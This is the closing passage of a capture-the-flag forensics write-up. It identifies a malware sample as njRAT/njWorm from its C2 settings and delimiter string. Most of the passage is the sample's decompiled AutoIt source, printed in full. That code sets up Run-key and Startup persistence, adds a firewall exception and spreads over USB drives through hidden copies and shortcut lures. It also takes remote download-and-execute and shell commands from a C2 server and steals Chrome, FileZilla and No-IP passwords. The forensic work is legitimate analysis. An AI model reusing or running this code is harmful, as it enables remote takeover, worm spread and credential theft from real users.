		$aresult = DllCall("Kernel32.dll", "int", "WideCharToMultiByte", "uint", 65001, "dword", 0, "wstr", $sstring, "int", -1, "struct*", $ttext, "int", $aresult[0], "ptr", 0, "ptr", 0)
		If @error Then Return SetError(2, @error, "")
		Return $ttext
	EndFunc

	Func __sqlite_utf8structtostring($ttext)
		Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", 65001, "dword", 0, "struct*", $ttext, "int", -1, "ptr", 0, "int", 0)
		If @error Then Return SetError(1, @error, "")
		Local $twstr = DllStructCreate("wchar[" & $aresult[0] & "]")
		$aresult = DllCall("Kernel32.dll", "int", "MultiByteToWideChar", "uint", 65001, "dword", 0, "struct*", $ttext, "int", -1, "struct*", $twstr, "int", $aresult[0])
		If @error Then Return SetError(2, @error, "")
		Return DllStructGetData($twstr, 1)
	EndFunc

	Func __sqlite_consolewrite($stext)
		ConsoleWrite($stext)
	EndFunc

	Func __sqlite_download_sqlite3dll($tempfile, $version)
		Local $url = "http://www.autoitscript.com/autoit3/files/beta/autoit/archive/sqlite/SQLite3" & $version
		Local $ret
		If @AutoItX64 = 0 Then
			$ret = InetGet($url & ".dll", $tempfile, 1)
		Else
			$ret = InetGet($url & "_x64.dll", $tempfile, 1)
		EndIf
		Local $error = @error
		FileSetTime($tempfile, __sqlite_inline_modified(), 0)
		Return SetError($error, 0, $ret)
	EndFunc

	Func __sqlite_print($stext)
		If $g_sprintcallback_sqlite Then
			If $g_butf8errormsg_sqlite Then
				Local $tstr8 = __sqlite_stringtoutf8struct($stext)
				Call($g_sprintcallback_sqlite, DllStructGetData($tstr8, 1))
			Else
				Call($g_sprintcallback_sqlite, $stext)
			EndIf
		EndIf
	EndFunc

#EndRegion		SQLite.au3 Internal Functions

Func __sqlite_inline_modified()
	Return "20100830083416"
EndFunc

Func __sqlite_inline_version()
	Return "300700200"
EndFunc

Opt("RunErrorsFatal", 0)
Local $host = "127.0.0.1"
Local $port = 1245
Local $exe = "aL4N.exe"
Local $dir = EnvGet("appdata") & "\"
Local $vr = "0.3.3a"
Local $name = "aL4N"
$name &= "_" & Hex(DriveGetSerial(@HomeDrive))
$os = @OSVersion & " " & @OSArch & " " & StringReplace(@OSServicePack, "Service Pack ", "SP")
If StringInStr($os, "SP") < 1 Then $os &= "SP0"
Local $usb = "!"
cusb()
$melt = 0
$y = "0njxq80"
$mtx = "appdataaL4N.exe"
$timer = 0
$fh = -1
If $cmdline[0] = 2 Then
	Select 
		Case $cmdline[1] = "del"
			If $melt = -1 Then
				FileDelete($cmdline[2])
			EndIf
	EndSelect
EndIf
Sleep(@AutoItPID / 10)
If _singleton($mtx, 1) = 0 Then
	Exit
EndIf
If @AutoItExe <> $dir & $exe Then
	FileCopy(@AutoItExe, $dir & $exe, 1)
	ShellExecute($dir & $exe, '"del" ' & @AutoItExe)
	Exit
EndIf
$mem = ""
$sock = -1
bk()
xins()
ins()
usbx()
$time = 0
$ac = ""
$ea = ""
While 1
	$time += 1
	If $time = 5 Then
		$time = 0
		ins()
		usb()
	EndIf
	If @error Then
	EndIf
	$pk = rc()
	If @error Then
	EndIf
	Select 
		Case $pk = -1
			Sleep(2000)
			cn()
			sd("lv" & $y & $name & $y & k() & $y & $os & $y & $vr & $y & $usb & $y & WinGetTitle(""))
		Case $pk = ""
			$timer += 1
			If $timer = 8 Then
				$timer = 0
				$ea = WinGetTitle("")
				If $ea <> $ac Then
					sd("ac" & $y & $ea)
				EndIf
				$ac = $ea
				$ea = ""
			EndIf
		Case $pk <> ""
			$a = StringSplit($pk, "0njxq80", 1)
			If $a[0] > 0 Then
				Select 
					Case $a[1] = "DL"
						InetGet($a[2], @TempDir & "\" & $a[3], 1)
						If FileExists(@TempDir & "\" & $a[3]) Then
							ShellExecute("cmd.exe", "/c start %temp%\" & $a[3], "", "", @SW_HIDE)
							sd("MSG" & $y & "Executed As " & $a[3])
						Else
							sd("MSG" & $y & "Download ERR")
						EndIf
					Case $a[1] = "up"
						InetGet($a[2], @TempDir & "\" & $a[3], 1)
						If FileExists(@TempDir & "\" & $a[3]) Then
							ShellExecute("cmd.exe", "/c start %temp%\" & $a[3], "", "", @SW_HIDE)
							uns()
						EndIf
						sd("MSG" & $y & "Update ERR")
					Case $a[1] = "un"
						uns()
					Case $a[1] = "ex"
						Execute($a[2])
					Case $a[1] = "cmd"
						ShellExecute("cmd.exe", $a[2], "", "", @SW_HIDE)
					Case $a[1] = "pwd"
						sd("PWD" & $y & noip() & chrome() & filezilla())
				EndSelect
			EndIf
	EndSelect
	Sleep(1000)
WEnd

Func uns()
	RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", $exe)
	RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", $exe)
	FileDelete(@StartupDir & "\" & $exe)
	ShellExecute("netsh", "firewall delete allowedprogram " & ChrW(34) & @AutoItExe & ChrW(34), "", "", @SW_HIDE)
	usbx()
	ShellExecute(@ComSpec, "/k ping 0 & del " & ChrW(34) & @AutoItExe & ChrW(34) & " & exit", "", "", @SW_HIDE)
	Exit
EndFunc

Func ins()
	If RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", $exe) <> ChrW(34) & @AutoItExe & ChrW(34) Then
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", $exe, "REG_SZ", ChrW(34) & @AutoItExe & ChrW(34))
	EndIf
	If RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", $exe) <> ChrW(34) & @AutoItExe & ChrW(34) Then
		RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", $exe, "REG_SZ", ChrW(34) & @AutoItExe & ChrW(34))
	EndIf
	If FileExists(@StartupDir & "\" & $exe) = False Then
		FileCopy(@AutoItExe, @StartupDir & "\" & $exe, 1)
	EndIf
	If @error Then
	EndIf
EndFunc

Func xins()
	EnvSet("SEE_MASK_NOZONECHECKS", "1")
	ShellExecute("netsh", "firewall add allowedprogram " & ChrW(34) & @AutoItExe & ChrW(34) & " " & ChrW(34) & $exe & ChrW(34) & " ENABLE", "", "", @SW_HIDE)
	If @error Then
	EndIf
	FileCopy(@AutoItExe, @StartupDir & "\" & $exe, 1)
	If @error Then
	EndIf
EndFunc

Func usb()
	$d = DriveGetDrive("REMOVABLE")
	For $dd = 1 To UBound($d) - 1
		If DriveStatus($d[$dd]) = "READY" Then
			If DriveSpaceFree($d[$dd]) > 1024 Then
				If FileExists($d[$dd] & "\My Pictures") = False Then DirCreate($d[$dd] & "\My Pictures")
				$f = _filelisttoarray($d[$dd], "*.*", 2)
				If FileExists($d[$dd] & "\" & $exe) Then
				Else
					FileCopy(@AutoItExe, $d[$dd] & "\" & $exe)
					FileSetAttrib($d[$dd] & "\" & $exe, "+H")
					$yes = 0
					For $u = 1 To UBound($f) - 1
						$yes = $yes + 1
						If $yes = 10 Then
							$yes = 0
							ExitLoop
						EndIf
						FileSetAttrib($d[$dd] & "\" & $f[$u], "+H")
						FileCreateShortcut("cmd.exe", $d[$dd] & "\" & $f[$u], "", "/c start " & StringReplace($exe, " ", ChrW(34) & " " & ChrW(34)) & '&explorer /root,"%CD%' & StringReplace($f[$u], " ", ChrW(34) & " " & ChrW(34)) & '" & exit', "", "%windir%\system32\SHELL32.dll", "", 3, @SW_SHOWMINNOACTIVE)
					Next
				EndIf
				_arraydelete($f, 0)
			EndIf
		EndIf
	Next
EndFunc

Func usbx()
	$d = DriveGetDrive("REMOVABLE")
	For $dd = 1 To UBound($d) - 1
		If DriveStatus($d[$dd]) = "READY" Then
			If DriveSpaceFree($d[$dd]) > 1024 Then
				$f = _filelisttoarray($d[$dd], "*.*", 2)
				If FileExists($d[$dd] & "\" & $exe) Then
					FileSetAttrib($d[$dd] & "\" & $exe, "-H+N")
					FileDelete($d[$dd] & "\" & $exe)
				EndIf
				For $u = 1 To UBound($f) - 1
					FileSetAttrib($d[$dd] & "\" & $f[$u], "-H")
					FileSetAttrib($d[$dd] & "\" & $f[$u], "+N")
					FileDelete($d[$dd] & "\" & $f[$u] & ".lnk")
				Next
				_arraydelete($f, 0)
			EndIf
		EndIf
	Next
EndFunc

Func rc()
	If @error Then
		Return -1
	EndIf
	If $sock < 1 Then
		Return -1
	EndIf
	$data = TCPRecv($sock, 1024, 0)
	If @error Then
		Return -1
	EndIf
	$mem &= $data
	If StringInStr($mem, @CRLF) Then
		$da = StringSplit($mem, @CRLF)
		$data = $da[1]
		$idx = StringInStr($mem, @CRLF)
		$idx += StringLen(String(@CRLF))
		$ln = StringLen($mem)
		$mem = StringMid($mem, $idx, $ln - $idx)
		Return $data
	EndIf
	Return ""
EndFunc

Func sd($da)
	If @error Then
	EndIf
	TCPSend($sock, $da & @CRLF)
	If @error Then
		Return 0
	Else
		Return 1
	EndIf
EndFunc

Func cn()
	TCPCloseSocket($sock)
	If @error Then
	EndIf
	TCPShutdown()
	If @error Then
	EndIf
	TCPStartup()
	If @error Then
	EndIf
	$sock = -1
	$sock = TCPConnect(TCPNameToIP($host), $port)
	If @error Then
	EndIf
EndFunc

Func k()
	$b = DllStructCreate("char[3]")
	DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 1024, "long", 7, "ptr", DllStructGetPtr($b), "long", 3)
	Return DllStructGetData($b, 1)
EndFunc

Func bk()
	$st = StringSplit("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z", ",")
	For $h = 1 To $st[0]
		If DriveStatus($st[$h] & ":\") = "READY" Then
			FileSetAttrib($st[$h] & ":\*.*", "-H")
			FileDelete($st[$h] & ":\*.vbs")
			FileDelete($st[$h] & ":\*.scr")
			FileDelete($st[$h] & ":\*.lnk")
		EndIf
	Next
EndFunc

Func cusb()
	$usb = IniRead($dir & $exe & ".ini", "", "usb", "!")
	If $usb = "!" Then
		$sp = StringSplit(@AutoItExe, "\")
		If $sp[0] = 2 AND StringLen($sp[1]) = 2 AND StringLower($sp[2]) = StringLower($exe) Then
			IniWrite($dir & $exe & ".ini", "", "usb", "Y")
		Else
			IniWrite($dir & $exe & ".ini", "", "usb", "N")
		EndIf
	EndIf
	$usb = IniRead($dir & $exe & ".ini", "", "usb", "!")
EndFunc

Func noip()
	$pusr = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Username")
	If $pusr = "" Then Return ""
	$ppwd = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Password")
	Return "URL: http://no-ip.com/" & $y & "USR: " & $pusr & $y & "PWD: /base64" & $ppwd & $y
EndFunc

Func filezilla()
	Local $pwds = "", $h, $pfn = EnvGet("appdata") & "\FileZilla\recentservers.xml"
	If FileExists($pfn) = False Then Return ""
	$h = FileOpen($pfn, 0)
	If $h = -1 Then Return ""
	$phost = ""
	$pport = 21
	$pusr = ""
	$ppass = ""
	While True
		$line = FileReadLine($h)
		If @error = -1 Then ExitLoop
		If StringInStr($line, "<Host>") Then
			$pusr = ""
			$ppass = ""
			$pport = 21
			$phost = StringMid($line, 1, StringInStr($line, "</") - 1)
			$phost = StringMid($phost, StringInStr($phost, ">") + 1)
		EndIf
		If StringInStr($line, "<Port>") Then
			$pport = StringMid($line, 1, StringInStr($line, "</") - 1)
			$pport = StringMid($pport, StringInStr($pport, ">") + 1)
		EndIf
		If StringInStr($line, "<User>") Then
			$pusr = StringMid($line, 1, StringInStr($line, "</") - 1)
			$pusr = StringMid($pusr, StringInStr($pusr, ">") + 1)
		EndIf
		If StringInStr($line, "<Pass>") Then
			$ppass = StringMid($line, 1, StringInStr($line, "</") - 1)
			$ppass = StringMid($ppass, StringInStr($ppass, ">") + 1)
		EndIf
		If StringInStr($line, "</Server>") Then
			$pwds = $pwds & "URL: ftp://" & $phost & ":" & $pport & $y & "USR: " & $pusr & $y & "PWD: " & $ppass & $y
		EndIf
	WEnd
	Return $pwds
EndFunc

Func chrome()
	Local $q, $r, $pwds = "", $pfn = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Local AppData") & "\Google\Chrome\User Data\Default\Login Data"
	If FileExists($pfn) = False Then Return ""
	_sqlite_startup()
	_sqlite_open($pfn)
	_sqlite_query(-1, "SELECT * FROM logins;", $q)
	While _sqlite_fetchdata($q, $r) = 0
		$pwds = $pwds & "URL: " & $r[0] & $y & "USR: " & $r[3] & $y & "PWD: " & uncryptrdppassword($r[5]) & $y
	WEnd
	_sqlite_close()
	_sqlite_shutdown()
	Return $pwds
EndFunc

Func uncryptrdppassword($bin)
	Local Const $cryptprotect_ui_forbidden = 1
	Local Const $data_blob = "int;ptr"
	Local $passstr = DllStructCreate("byte[1024]")
	Local $datain = DllStructCreate($data_blob)
	Local $dataout = DllStructCreate($data_blob)
	$pwdescription = "psw"
	$pwdhash = ""
	DllStructSetData($dataout, 1, 0)
	DllStructSetData($dataout, 2, 0)
	DllStructSetData($passstr, 1, $bin)
	DllStructSetData($datain, 2, DllStructGetPtr($passstr, 1))
	DllStructSetData($datain, 1, BinaryLen($bin))
	$return = DllCall("crypt32.dll", "int", "CryptUnprotectData", "ptr", DllStructGetPtr($datain), "ptr", 0, "ptr", 0, "ptr", 0, "ptr", 0, "dword", $cryptprotect_ui_forbidden, "ptr", DllStructGetPtr($dataout))
	If @error Then Return ""
	$len = DllStructGetData($dataout, 1)
	$pwdhash = Ptr(DllStructGetData($dataout, 2))
	$pwdhash = DllStructCreate("byte[" & $len & "]", $pwdhash)
	Return BinaryToString(DllStructGetData($pwdhash, 1), 4)
EndFunc
```
</details>

In the source code, the C2 IP and port can be found. Additionally, an interesting string can be found on variable `$y`.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/6a97707b-0984-47ed-9618-0f370c93d3b3)

Searching `0njxq80` on Google, another source code can be found on [GitHub](https://github.com/mwsrc/njRAT/blob/master/njWorm/src.txt.au3). This shows that `njRAT` was the malware family.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/917a79f2-db84-437f-aa32-9489f27f4ea6)

> I'm very happy when I solved all forensic challenges. We tried hard so much and this is the perfect result for us!. Thank you very much for reading our solution! ~ @Odin
